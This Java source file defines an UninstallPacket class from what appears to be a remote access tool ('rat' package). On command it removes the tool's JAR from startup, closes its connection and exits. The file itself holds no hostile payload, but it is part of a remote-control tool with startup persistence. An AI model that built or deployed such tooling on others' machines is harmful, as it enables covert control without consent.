/*
 * Copyright 2016 Johannes Boczek
 */

package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.Constants;

public final class UninstallPacket implements IPacket {
	
	public UninstallPacket() {
		//...
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		//...
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		//...
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		final String name = Constants.JAR_FILE.getName();
		
		Constants.OS_SERVICE.removeFromStartup(name);
		
		connection.setObserver(null);
		connection.close();
		
		System.exit(0);
	}
	
}
